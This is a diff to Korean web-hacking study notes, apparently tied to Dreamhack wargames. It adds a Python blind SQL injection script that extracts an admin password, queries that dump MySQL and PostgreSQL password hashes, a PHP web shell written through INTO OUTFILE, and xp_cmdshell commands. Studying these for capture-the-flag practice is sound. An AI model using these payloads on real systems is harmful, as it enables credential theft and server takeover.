@@ -7,8 +7,19 @@
     - [Same Origin Policy (SOP)](#same-origin-policy-sop)
     - [Cross Origin Resource Sharing (CORS)](#cross-origin-resource-sharing-cors)
     - [JSON with Padding (JSONP)](#json-with-padding-jsonp)
+    - [Content Security Policy (CSP)](#content-security-policy-csp)
+  - [Vulnerability](#vulnerability)
+    - [CSRF](#csrf)
+    - [SQL Injection](#sql-injection)
+    - [NoSQL Injection](#nosql-injection)
+    - [DBMS Misconfiguration](#dbms-misconfiguration)
+    - [Command Injection](#command-injection)
+  - [Database](#database)
+    - [SQL \& MongoDB(NoSQL)](#sql--mongodbnosql)
+    - [Redis](#redis)
 
 ## Mitigation
+> https://w01fgang.tistory.com/147 참고
 
 ### Same Origin Policy (SOP)
 - SOP는 Cross Origin이 아닌 Same Origin일 때만 정보를 읽을 수 있도록 해줍니다.
@@ -87,6 +98,9 @@ https://theori.io의 스크립트를 로드하는 HTML 코드입니다.
 <script src='http://theori.io/whoami?callback=myCallback'></script>
 ```
 
+### Content Security Policy (CSP)
+- 링크 참고
+
 ## Vulnerability
 
 ### CSRF
@@ -106,6 +120,311 @@ location.href = 'http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337';
 location.replace('http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337');
 ```
 
+### SQL Injection
+- Blind
+> https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1 참고
+- Error based
+```sql
+SELECT extractvalue(1,concat(0x3a,version()));
+/*
+ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
+*/
+
+mysql> SELECT extractvalue(1,concat(0x3a,(SELECT password FROM users WHERE username='admin')));
+/*
+ERROR 1105 (HY000): XPATH syntax error: ':Th1s_1s_admin_PASSW@rd'
+*/
+```
+- Error based blind
+```sql
+mysql> select if(1=1, 9e307*2,0);
+ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 2)'
+mysql> select if(1=0, 9e307*2,0);
++--------------------+
+| if(1=0, 9e307*2,0) |
++--------------------+
+|                  0 |
++--------------------+
+1 row in set (0.00 sec)
+```
+[dreamhack prob:](https://dreamhack.io/wargame/challenges/411)
+> 한글 섞인 Error based blind injection
+```py
+import requests
+
+URL = "http://host3.dreamhack.games"
+PORT = "14174"
+FULL_URL = URL + ":" + PORT + "/"
+
+FAILED = "SELECT * FROM"
+SUCESS = "Server Error"
+
+flag = ''
+
+if __name__ == "__main__":
+    exp = "char_length(upw) = 13"
+    query = f"' or 1=1  and uid='admin' and  if({exp}, 9e307*2, 0)-- x"
+    data = requests.get(FULL_URL + "?uid=" + query)
+
+    FLAG_LENGTH = 13
+    for i in range(1, FLAG_LENGTH+1):
+        bit_length = 1
+        while True:
+            exp = f"length(bin(ord(substr(upw, {i}, 1)))) = {bit_length}"
+            query = "' or 1=1  and uid='admin' and  if("+exp+", 9e307*2, 0)-- x"
+            data = requests.get(FULL_URL + "?uid=" + query)
+
+            if SUCESS in data.text:
+                break
+            else:
+                bit_length += 1
+        print(f"bit_length: {bit_length}")
+        tmp = ''
+        for j in range(1, bit_length+1):
+            exp = f"substr(bin(ord(substr(upw, {i}, 1))), {j}, 1) = 1"
+            query = "' or 1=1  and uid='admin' and  if("+exp+", 9e307*2, 0)-- x"
+            data = requests.get(FULL_URL + "?uid=" + query)
+
+            if SUCESS in data.text:
+                tmp += str(1)
+            else:
+                tmp += str(0)
+        flag += int.to_bytes(int(tmp, 2), (bit_length + 7) // 8, "big").decode("utf8")
+        print(f"FLAG: {flag}")
+```
+
+- MYSQL 정보 탈취
+```sql
+mysql> select TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS;
+/*
++--------------------+----------------+--------------------+
+| TABLE_SCHEMA       | TABLE_NAME     | COLUMN_NAME        |
++--------------------+----------------+--------------------+
+| information_schema | CHARACTER_SETS | CHARACTER_SET_NAME |
+...
+| DREAMHACK          | users          | uid                |
+| DREAMHACK          | users          | upw                |
+...
+| mysql              | db             | Db                 |
+| mysql              | db             | User               |
+...
++--------------------+----------------+--------------------+
+3132 rows in set (0.07 sec)
+*/
+```
+```sql
+mysql> select * from information_schema.PROCESSLIST;
+/*
++-------------------------------------------------+
+| info                                            |
++-------------------------------------------------+
+| select info from information_schema.PROCESSLIST |
++-------------------------------------------------+
+1 row in set (0.00 sec)
+*/
+```
+```sql
+mysql> select user,current_statement from sys.session;
+/*
++----------------+------------------------------------------------+
+| user           | current_statement                              |
++----------------+------------------------------------------------+
+| root@localhost | select user,current_statement from sys.session |
++----------------+------------------------------------------------+
+1 row in set (0.05 sec)
+*/
+```
+```sql
+mysql> select GRANTEE,PRIVILEGE_TYPE,IS_GRANTABLE from information_schema.USER_PRIVILEGES;
+/*
+PRIVILEGE_TYPE: 특정 사용자가 가진 권한의 종류를 나타냅니다.
+IS_GRANTABLE: 특정 사용자가 자신의 권한을 다른 유저에게 줄 수 있는지 YES 또는 NO로 표시됩니다.
++-------------------------+-------------------------+--------------+
+| GRANTEE                 | PRIVILEGE_TYPE          | IS_GRANTABLE |
++-------------------------+-------------------------+--------------+
+| 'root'@'localhost'      | SELECT                  | YES          |
+...
+| 'root'@'localhost'      | SUPER                   | YES          |
+...
+| 'user_test'@'localhost' | USAGE                   | NO           |
++-------------------------+-------------------------+--------------+
+58 rows in set (0.00 sec)
+*/
+```
+```sql
+mysql> select User, authentication_string from mysql.user;
+/*
+authentication_string: 사용자의 비밀번호를 해싱한 값 입니다.
++------------------+-------------------------------------------+
+| User             | authentication_string                     |
++------------------+-------------------------------------------+
+| root             | *...                                      |
+| mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
+| mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
+| user_test        | *...                                      |
++------------------+-------------------------------------------+
+4 rows in set (0.00 sec)
+*/
+```
+- MSSQL 정보 탈취
+```sql
+SELECT name FROM sys.databases
+/*
+name
+-------
+master
+tempdb
+model
+msdb
+dreamhack # 이용자 정의 데이터베이스 (예시)
+*/
+```
+```sql
+SELECT name FROM master..sysdatabases;
+/*
+name
+-------
+master
+tempdb
+model
+msdb
+dreamhack # 이용자 정의 데이터베이스 (예시)
+*/
+```
+```sql
+SELECT DB_NAME(1);
+/*
+master
+*/
+
+USE dreamhack;
+/*
+Changed database context to 'dreamhack'.
+*/
+
+SELECT DB_NAME(0);
+/*
+dreamhack
+*/
+```
+```sql
+SELECT name FROM dreamhack..sysobjects WHERE xtype = 'U';
+# xtype='U' 는 이용자 정의 테이블을 의미합니다.
+/*
+name
+-------
+users
+*/
+```
+```sql
+SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users');
+/*
+name
+-----
+uid
+upw
+*/
+```
+- PostgreSQL 정보 탈취
+```sql
+postgres=$ select datname from pg_database;
+/*
+  datname  
+-----------
+ postgres
+ template1
+ template0
+(3 rows)
+*/
+```
+```sql
+postgres=$ select nspname from pg_catalog.pg_namespace;
+/*
+      nspname       
+--------------------
+ pg_toast
+ pg_temp_1
+ pg_toast_temp_1
+ pg_catalog
+ public
+ information_schema
+(6 rows)
+*/
+```
+```sql
+postgres=$ select table_name from information_schema.tables where table_schema='pg_catalog';
+/*
+           table_name
+---------------------------------
+pg_shadow
+pg_settings
+pg_database
+pg_stat_activity
+...
+*/
+
+postgres=# select table_name from information_schema.tables where table_schema='information_schema';
+/*
+              table_name
+---------------------------------------
+schemata
+tables
+columns
+...
+*/
+```
+```sql
+postgres=$ select usename, passwd from pg_catalog.pg_shadow;
+/*
+ usename  |               passwd
+----------+-------------------------------------
+ postgres | md5df6802cb10f4000bf81de27261c1155f
+(1 row)
+*/
+```
+```sql
+postgres=$ select name, setting from pg_catalog.pg_settings;
+/*
+                  name                  |                 setting
+----------------------------------------+------------------------------------------
+ allow_system_table_mods                | off
+ application_name                       | psql
+ ...
+*/
+```
+```sql
+postgres=$ select usename, query from pg_catalog.pg_stat_activity;
+/*
+ usename  |                          query                          
+----------+---------------------------------------------------------
+ postgres | select usename, query from pg_catalog.pg_stat_activity;
+(1 row)
+*/
+```
+- Oracle 정보 탈취
+```sql
+SELECT DISTINCT owner FROM all_tables
+SELECT owner, table_name FROM all_tables
+
+SELECT column_name FROM all_tab_columns WHERE table_name = 'users'
+
+SELECT * FROM all_users
+```
+
+- SQLite
+```sql
+sqlite> .header on
+-- 콘솔에서 실행 시 컬럼 헤더를 출력하기 위해 설정합니다.
+
+sqlite> open dreamhack.db
+-- 데이터베이스를 연결합니다.
+
+sqlite> select * from sqlite_master;
+/*
+type|name|tbl_name|rootpage|sql
+table|users|users|2|CREATE TABLE users (uid text, upw text)
+*/
+```
 ### NoSQL Injection
 - $regex
 ```js
@@ -162,6 +481,50 @@ error: {
 > db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='a'&&asdf&&'1'&&this.upw=='${upw}'"});
 // this.upw.substring(0,1)=='a' 값이 거짓이기 때문에 뒤에 코드가 작동하지 않음
 ```
+
+### DBMS Misconfiguration
+- MySQL
+```sh
+# my.cnf
+[mysqld]
+# secure_file_priv = ""   # 미설정. 기본 설정 값으로 설정됩니다.
+secure_file_priv = "/tmp" # 해당 디렉터리 하위 경로에만 접근 가능합니다.
+secure_file_priv = ""     # mysql의 권한이 가능한 모든 경로에 접근이 가능합니다.
+secure_file_priv = NULL   # 기능이 비활성화 됩니다.
+```
+```sql
+mysql> select @@secure_file_priv;
++-----------------------+
+| @@secure_file_priv    |
++-----------------------+
+| /var/lib/mysql-files/ |
++-----------------------+
+```
+`load_file & into outfile:`
+```sql
+# echo test1234 > /var/lib/mysql-files/test
+mysql> select load_file('/var/lib/mysql-files/test');
++----------------------------------------+
+| load_file('/var/lib/mysql-files/test') |
++----------------------------------------+
+| test1234                               |
++----------------------------------------+
+```
+```sql
+mysql> select '<?=`$_GET[0]`?>' into (outfile/dumpfile) '/tmp/a.php';
+/* <?php include $_GET['page'].'.php'; // "?page=../../../tmp/a?0=ls" */
+```
+- MSSQL
+```sql
+SELECT name, value, description FROM sys.configurations WHERE name = 'xp_cmdshell'
+```
+```sql
+EXEC xp_cmdshell "net user";
+EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
+```
+
+### Command Injection
+
 
 ## Database
 ### SQL & MongoDB(NoSQL)
